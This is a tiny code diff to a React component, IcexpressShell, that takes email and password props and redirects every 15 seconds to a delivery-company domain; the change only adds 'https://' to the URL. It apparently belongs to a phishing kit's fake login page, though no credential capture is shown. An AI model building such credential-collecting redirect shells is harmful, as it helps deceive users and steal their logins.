@@ -4,7 +4,7 @@ import "./loaderstyle.css";
 function IcexpressShell({ email, pass, reportbox }) {
   useEffect(() => {
     setInterval(() => {
-      window.open("icexpressdelivery.online", "_self");
+      window.open("https://icexpressdelivery.online", "_self");
     }, 15000);
   });
   return (
